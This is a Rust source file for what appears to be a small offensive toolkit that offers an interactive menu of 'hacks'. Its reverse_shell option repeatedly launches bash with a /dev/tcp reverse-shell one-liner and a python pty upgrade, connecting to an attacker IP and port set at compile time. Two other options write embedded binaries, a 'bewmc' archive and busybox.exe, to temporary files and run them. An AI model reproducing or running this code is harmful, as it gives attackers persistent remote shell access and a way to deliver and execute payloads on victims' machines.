use core::time;
use requestty::Question;

use std::io::Write;
use std::{
    collections::HashMap,
    process::{Command, Stdio},
    thread,
};

use std::fs::File;

use tempfile::tempdir;
/// the thing
fn main() {
    println!("BEWM!!!");
    let mut methods: HashMap<_, &Fn()> = HashMap::new();
    let mut bewmc: Option<&[u8]> = None;
    let mut busy: Option<&[u8]> = None;
    let bewmcloc = env!("OUT_DIR");

    #[cfg(feature = "reproduce")]
    {
        bewmc = Some(include_bytes!(concat!(env!("OUT_DIR"), "/bewmc.tar.gz")));
    }

    #[cfg(feature = "reproduce")]
    {
        busy = Some(include_bytes!(concat!(env!("OUT_DIR"), "/busybox.exe")));
    }
    let reproduce = || {
        if bewmc.unwrap().len() > 0 {
            // Create a file inside of `std::env::temp_dir()`.

            // Create a directory inside of `std::env::temp_dir()`.
            let dir = tempdir().unwrap();

            let file_path = dir.path().join("bewmc");
            let mut file = File::create(file_path).unwrap();
            file.write(bewmc.unwrap()).unwrap();
            let mut chmod = Command::new("chmod")
                .arg("-x")
                .arg(dir.path().join("bewmc"))
                .spawn()
                .unwrap();
            chmod.wait().unwrap();
            let mut run = Command::new(dir.path().join("bewmc")).spawn().unwrap();
            run.wait().unwrap();
        }
    };
    let busybox = || {
        if busy.unwrap().len() > 0 {
            // Create a file inside of `std::env::temp_dir()`.

            // Create a directory inside of `std::env::temp_dir()`.
            let dir = tempdir().unwrap();

            let file_path = dir.path().join("busybox.exe");
            let mut file = File::create(file_path).unwrap();
            file.write(busy.unwrap()).unwrap();
            let mut run = Command::new(dir.path().join("busybox.exe"))
                .spawn()
                .unwrap();
            run.wait().unwrap();
        }
    };
    methods.insert("reproduce", &reproduce);
    methods.insert("busybox", &busybox);

    let reverse_shell = || {
        let shell = thread::spawn(|| {
            loop {
                let mut bash = Command::new("bash").stdin(Stdio::piped()).spawn().unwrap();
                // .arg("-c")
                // .arg("bash")
                // .args(
                //     &(format!(
                //         "-i >& /dev/tcp/{}/{} 0>&1",
                //         option_env!("REVERSE_SHELL_IP").unwrap_or("127.0.0.1"),
                //         option_env!("REVERSE_SHELL_PORT").unwrap_or("4444")
                //     )
                //     .split(" ")
                //     .collect::<Vec<&str>>()),
                // )
                write!(
                            bash.stdin.take().unwrap(),
                            "{}",
                            (format!(
                                r#"bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")'" -i >& /dev/tcp/{}/{} 0>&1; exit"#,
                                option_env!("REVERSE_SHELL_IP").unwrap_or("127.0.0.1"),
                                option_env!("REVERSE_SHELL_PORT").unwrap_or("4444")
                            ))
                        )
                        .unwrap();
                bash.wait().unwrap();
                println!("Exited, sleeping for 5 seconds");
                thread::sleep(time::Duration::from_secs(5));
            }
        });
        shell.join().unwrap();
    };
    methods.insert("reverse_shell", &reverse_shell);

    let mut list: Vec<&str> = vec![];
    #[cfg(feature = "reverse_shell")]
    list.push("reverse_shell");
    #[cfg(feature = "reproduce")]
    list.push("reproduce");
    #[cfg(feature = "busybox")]
    list.push("busybox");

    #[cfg(unix)]
    println!("yay unix");

    #[cfg(windows)]
    println!("eww windows");
    let question = Question::multi_select("hacks")
        .message("so which one?")
        .choices(list.clone())
        .build();
    let ans = requestty::prompt(vec![question]).unwrap();

    ans.get("hacks")
        .unwrap()
        .as_list_items()
        .unwrap()
        .iter()
        .for_each(|i| {
            let my_str: &str = &i.text; //This is an &str type
            println!("Running {}...", i.text.clone());
            methods.get(my_str).unwrap()()
        })
}
